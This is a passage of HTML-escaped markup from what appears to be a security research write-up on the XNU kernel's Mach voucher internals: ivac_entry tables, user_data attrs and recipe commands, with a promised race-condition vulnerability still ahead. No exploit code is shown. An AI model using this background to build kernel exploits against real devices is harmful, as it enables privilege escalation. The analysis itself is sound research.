class="BGLtzooHlW-c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace_u&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivace_next&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* hash or freelist */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivace_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* hash head (independent) */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_refs&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a reference count for this table index. Note that this entry is &lt;/span&gt;&lt;span class="BGLtzooHlW-c17"&gt;inline&lt;/span&gt;&lt;span&gt;&amp;nbsp;in an array;&lt;/span&gt;&lt;span&gt;&amp;nbsp;so this reference count going to zero doesn&amp;#39;t cause the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac_entry_s&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;to be free&amp;#39;d back to a kernel allocator (like the zone allocator for example.) Instead, it moves this table index onto a freelist of empty entries. The table can grow but never shrink.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Table entries which aren&amp;#39;t free store a type-specific &amp;quot;handle&amp;quot; in &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;. Here&amp;#39;s the typedef chain for that type:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.9c51000ec2d891dfe4854f95d2bbcf210598beb6"&gt;&lt;/a&gt;&lt;a id="t.9"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c3"&gt;iv_value_handle_t ivace_value&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;typedef&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;mach_voucher_attr_value_handle_t iv_value_handle_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;typedef&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;uint64_t mach_voucher_attr_value_handle_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;The handle is a &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;uint64_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;but in reality the attrs can (and do) store pointers there, hidden behind casts.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;A guarantee made by the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;attr_control&lt;/span&gt;&lt;span&gt;&amp;nbsp;is that there will only ever be one (live) &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac_entr&lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;y_s&lt;/span&gt;&lt;span&gt;&amp;nbsp;for a particular &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_value&lt;/span&gt;&lt;span&gt;. This means that each time a new &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;needs an &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;attr_control&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;needs to be searched to see if a matching value is already present. To speed this up in-use &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac_entries&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;are linked together in hash buckets so that a (hopefully significantly) shorter linked-list of entries can be searched rather than a linear scan of the whole table. (Note that it&amp;#39;s not a linked-list of pointers; each link in the chain is an index into the table.)&lt;/span&gt;&lt;/p&gt;&lt;h2 class="BGLtzooHlW-c5 BGLtzooHlW-c18" id="h.lsgi9jwnyyz4"&gt;&lt;span class="BGLtzooHlW-c20"&gt;Userdata attrs&lt;/span&gt;&lt;/h2&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;is one of the four types of supported, implemented voucher attr types. It&amp;#39;s only purpose is to manage buffers of arbitrary, user controlled data. Since the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;attr_control&lt;/span&gt;&lt;span&gt;&amp;nbsp;performs deduping only on the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;(which is a pointer) the userdata attr manager is responsible for ensuring that userdata values which have identical buffer values (matching length and bytes) have identical pointers.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;To do this it maintains a hash table of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;structures, which wrap a variable-sized buffer of bytes:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.300b9d1f1ee1dcff9a3ee0de164a2bc6bc43ea65"&gt;&lt;/a&gt;&lt;a id="t.10"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;user_data_value_element &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; mach_voucher_attr_value_reference_t e_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; &amp;nbsp;e_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;e_sum&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;e_hash&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; queue_chain_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; e_hash_link&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; uint8_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; e_data&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[];&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Each inline &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;buffer can be up to 16KB. &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_hash_link&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;stores the hash-table bucket list pointer.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is not a simple reference count. Looking through the code you&amp;#39;ll notice that there are no places where it&amp;#39;s ever decremented. Since there should (nearly) always be a 1:1 mapping between an &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;and a &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;this structure shouldn&amp;#39;t need to be reference counted. There is however one very fiddly race condition (which &lt;/span&gt;&lt;span class="BGLtzooHlW-c17"&gt;isn&amp;#39;t&lt;/span&gt;&lt;span&gt;&amp;nbsp;the race condition which causes the vulnerability!) which necessitates the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;e_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;field. This race condition is sort-of documented and we&amp;#39;ll get there eventually...&lt;/span&gt;&lt;/p&gt;&lt;h2 class="BGLtzooHlW-c18 BGLtzooHlW-c5" id="h.o5bp0ln346i3"&gt;&lt;span class="BGLtzooHlW-c20"&gt;Recipes&lt;/span&gt;&lt;/h2&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;host_create_mach_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;host port &lt;/span&gt;&lt;span&gt;MIG&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c21"&gt;&lt;a class="BGLtzooHlW-c251" href="https://www.nextop.de/NeXTstep_3.3_Developer_Documentation/OperatingSystem/Part1_Mach/02_Messages/Messages.htmld/index.html"&gt;Mach Interface Generator&lt;/a&gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;) method is the userspace interface for creating vouchers:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.3b86534681bae3851c58fa2f335e430bc6b5a4cb"&gt;&lt;/a&gt;&lt;a id="t.11"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c3"&gt;kern_return_t&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;host_create_mach_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_port_name_t host&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; mach_voucher_attr_raw_recipe_array_t recipes&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_size_t recipesCnt&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; mach_port_name_t &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;recipes&lt;/span&gt;&lt;span&gt;&amp;nbsp;points to a buffer filled with a sequence of packed variable-size &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;mach_voucher_attr_recipe_data&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;structures:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.fb086444030469a009e799e34240bece6d1dd33b"&gt;&lt;/a&gt;&lt;a id="t.12"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;typedef&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;struct&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;mach_voucher_attr_recipe_data &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; mach_voucher_attr_recipe_command_t command&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; mach_voucher_name_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;previous_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; uint8_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;content&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[];&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;key&lt;/span&gt;&lt;span&gt;&amp;nbsp;is one of the four supported voucher attr types we&amp;#39;ve seen before (importance, bank, pthread_priority and user_data) or a wildcard value (&lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_KEY_ALL&lt;/span&gt;&lt;span&gt;) indicating that the command should apply to all keys. There are a number of generic commands as well as type-specific commands. Commands can optionally refer to existing vouchers via the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;previous_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;field, which should name a voucher port.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;Here are the supported generic commands for voucher creation:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_COPY&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;: copy the attr value from the previous voucher. You can specify the wildcard key to copy all the attr values from the previous voucher.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_REMOVE&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;: remove the specified attr value from the voucher under construction. This can also remove all the attributes from the voucher under construction (which, arguably, makes no sense.)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_SET_VALUE_HANDLE:&lt;/span&gt;&lt;span&gt;&amp;nbsp;this command is only valid for kernel clients; it allows the caller to specify an arbitrary &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;, which doesn&amp;#39;t make sense for userspace and shouldn&amp;#39;t be reachable.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;: the semantics of &lt;/span&gt;&lt;span class="BGLtzooHlW-c14"&gt;redeeming&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;an attribute from a previous voucher are not defined by the voucher code; it&amp;#39;s up to the individual managers to determine what that might mean.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;Here are the attr-specific commands for voucher creation for each type:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c17"&gt;bank&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11 BGLtzooHlW-c19"&gt;MACH_VOUCHER_ATTR_BANK_CREATE&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c19 BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_BANK_MODIFY_PERSONA&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c19 BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_AUTO_REDEEM&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c19 BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_SEND_PREPROCESS&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c17"&gt;importance&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c19 BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_IMPORTANCE_SELF&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c17"&gt;user_data&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c19 BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c17"&gt;pthread_priority&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c19 BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_PTHPRIORITY_CREATE&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Note that there are further commands which can be &amp;quot;executed against&amp;quot; vouchers via the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;mach_voucher_attr_command&lt;/span&gt;&lt;span&gt;&amp;nbsp;MIG method which calls the attr manager&amp;#39;s&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivam_command&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;function pointer. Those are:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c17"&gt;bank&lt;/span&gt;&lt;span 